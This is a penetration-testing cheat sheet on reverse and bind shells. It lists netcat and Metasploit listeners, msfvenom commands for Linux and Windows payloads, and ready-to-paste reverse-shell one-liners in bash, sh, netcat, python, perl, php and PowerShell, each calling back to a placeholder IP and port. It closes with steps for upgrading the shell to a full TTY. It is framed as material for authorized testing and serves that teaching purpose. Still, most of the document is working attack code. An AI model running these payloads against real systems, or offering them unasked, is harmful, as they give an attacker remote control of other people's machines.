# Shells — basics

> **Generator: [https://www.revshells.com](https://www.revshells.com)** — set the listener IP and port, pick the language, copy the payload. It also has the listener command and the TTY-upgrade steps. Keep this open during an engagement; the snippets below are for when you have no browser on the box.

Authorized testing only. A reverse shell is a callback from a host you're already allowed to be on — the technique is standard post-exploitation, but the authorization is what makes it legal.

## Contents

- [Bind vs reverse](#bind-vs-reverse)
- [Start a listener](#start-a-listener)
- [Reverse shell one-liners](#reverse-shell-one-liners)
- [Upgrade to a full TTY](#upgrade-to-a-full-tty)
- [Which one to pick](#which-one-to-pick)
- [Related](#related)

## Bind vs reverse

| | Direction | Use when |
| --- | --- | --- |
| **Reverse** | Target connects **out** to you | Default. Target is behind NAT, or only outbound is allowed |
| **Bind** | You connect **in** to a port the target opens | Target has a routable IP and inbound is allowed; your box is the one behind NAT |

Reverse is the common case — set up [a listener](#start-a-listener), then run a [one-liner](#reverse-shell-one-liners) on the target pointed at your IP.

## Start a listener

```bash
nc -lvnp 4444                 # classic; -l listen -v verbose -n no-DNS -p port
rlwrap nc -lvnp 4444          # rlwrap adds arrow keys / history to the catch
pwncat-cs -lp 4444            # auto-stabilises the shell on connect — see pwncat.md
```

Full netcat reference in [netcat](netcat.md); pwncat in [pwncat](pwncat.md).

### With Metasploit — generate a payload and catch it

When you'd rather drop a payload file than paste a one-liner. Generate with `msfvenom`, set your `IP`/`PORT`, and get the file onto the target (transfer options in [netcat](netcat.md)). The `-a x64 --platform linux` below is pinned explicitly so msfvenom doesn't print the `No Arch selected` / `No platform was selected` notices.

```bash
# Linux target (x64) — standard meterpreter
msfvenom -p linux/x64/meterpreter/reverse_tcp -a x64 --platform linux LHOST=IP LPORT=PORT -f elf -o shell.elf
# Windows target (x64) — standard meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 --platform windows LHOST=IP LPORT=PORT -f exe -o shell.exe
```

> **`[-] No Arch selected, selecting Arch: x64 from the payload` is NOT an error** — it's an info line (note the misleading red `[-]`), and the file is still written. The command only "fails" if the shell prompt returns with no `Saved as: shell.elf`. Confirm it built: `ls -l shell.elf && file shell.elf`. Pinning `-a`/`--platform` as above removes the message entirely.
>
> **32-bit or unknown target?** A `x64` ELF won't run on a 32-bit host (`cannot execute binary file: Exec format error`). Swap to `-p linux/x86/shell_reverse_tcp -a x86 --platform linux` — a 32-bit payload is the safest "runs anywhere" choice when you're not sure of the target's architecture.

Catch it with the **matching handler** — a meterpreter payload will **not** work over a plain `nc` listener:

```bash
# set the payload to EXACTLY what you generated, or the session dies on connect
msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST IP; set LPORT PORT; set ExitOnSession false; run -j"
#   Windows: same line, but  set payload windows/x64/meterpreter/reverse_tcp
```

Then run it on the target (`chmod +x shell.elf; ./shell.elf`, or execute `shell.exe`).

**"Always works" fallback — stageless, caught by plain `nc`.** If staging is flaky or you just want a raw shell in the `nc -lvnp PORT` listener you already have, swap meterpreter for the self-contained `shell_reverse_tcp`:

```bash
msfvenom -p linux/x64/shell_reverse_tcp   -a x64 --platform linux   LHOST=IP LPORT=PORT -f elf -o shell.elf    # catch: nc -lvnp PORT
msfvenom -p windows/x64/shell_reverse_tcp -a x64 --platform windows LHOST=IP LPORT=PORT -f exe -o shell.exe    # catch: nc -lvnp PORT
```

Swap `x64` → `x86` (and `-a x64` → `-a x86`) for 32-bit targets; if unsure on Windows, the `x86` payload runs on both. More in [Metasploit](../Tools/Metasploit.md) (`multi/handler`).

> **ELF crashes on the target with `Segmentation fault (core dumped)`?** That's the **stageless** x64 ELF being fragile on modern Linux (glibc/kernel hardening) — not your setup. Two fixes, best first:
> - **On Linux, use a native one-liner instead.** The [bash / python reverse shells](#reverse-shell-one-liners) below are far more reliable than any msfvenom ELF and need no dropped file — this is the standard choice for a Linux target. The msfvenom route is mainly for Windows, or when you specifically need a file to upload-and-run.
> - **Need a dropped file?** Switch the stageless payload for the **staged** one and catch it with `multi/handler` (not `nc`) — the small stager execs cleanly where the stageless blob crashes:
>   ```bash
>   msfvenom -p linux/x64/shell/reverse_tcp -a x64 --platform linux LHOST=IP LPORT=PORT -f elf -o shell.elf
>   msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell/reverse_tcp; set LHOST IP; set LPORT PORT; run"
>   ```
>   Note `shell/reverse_tcp` (staged, needs the handler) vs `shell_reverse_tcp` (stageless, nc-catchable) — the `_` vs `/` is the whole difference. `linux/x64/meterpreter/reverse_tcp` is an equally robust staged option. Don't reach for encoders here — they rarely help Linux ELFs and often make the crash worse.

## Reverse shell one-liners

Set `IP` and `PORT` to your listener. Run **one** of these on the target.

```bash
# bash (most Linux targets)
bash -i >& /dev/tcp/IP/PORT 0>&1
# if the above is blocked, the explicit form:
bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
```

```bash
# POSIX sh — when bash isn't present
sh -i >& /dev/tcp/IP/PORT 0>&1
```

```bash
# netcat with -e
nc IP PORT -e /bin/sh
# netcat without -e (OpenBSD/traditional build, no -e) — mkfifo backpipe
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc IP PORT > /tmp/f
```

```bash
# python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh","-i"])'
```

```bash
# perl
perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
```

```php
// php
php -r '$s=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```powershell
# PowerShell (Windows target) — one line
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sr=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sr,0,$sr.Length);$s.Flush()};$c.Close()"
```

If one is blocked (no `/dev/tcp`, no `nc -e`, filtered interpreter), try the next — [revshells.com](https://www.revshells.com) has many more variants per language.

## Upgrade to a full TTY

A raw reverse shell has no job control, no tab-completion, no arrow keys, and `Ctrl-C` kills it. Upgrade it immediately:

```bash
# 1. spawn a pty
python3 -c 'import pty;pty.spawn("/bin/bash")'
#   no python? try:  script -qc /bin/bash /dev/null

# 2. background with Ctrl-Z, then on YOUR box:
stty raw -echo; fg
#   (press Enter twice)

# 3. back in the shell, fix the terminal:
export TERM=xterm
stty rows 50 cols 200      # match your window: run `stty size` locally first
```

Now `Ctrl-C`, history and editors work. [pwncat](pwncat.md) does all of this automatically on connect.

## Which one to pick

| Situation | Reach for |
| --- | --- |
| First callback, Linux | `bash -i >& /dev/tcp/...` → then upgrade the TTY |
| `bash` missing | `sh`, then `python3`, then `perl` |
| Windows | PowerShell one-liner, or `evil-winrm` ([Remote Access](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md)) |
| You want auto-stabilise + file transfer | [pwncat](pwncat.md) |
| Just need to catch and move on | `rlwrap nc -lvnp 4444` ([netcat](netcat.md)) |
| Building a payload, have a browser | [revshells.com](https://www.revshells.com) |

## Related

[netcat](netcat.md) · [pwncat](pwncat.md) · [Remote Access & Getting a Shell](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md) · [Linux Overview](../Linux/Linux%20Overview.md) (post-exploitation loop) · [RCE](../Web/RCE.md) (where web bugs become shells) · [Metasploit](../Tools/Metasploit.md) (`multi/handler`)
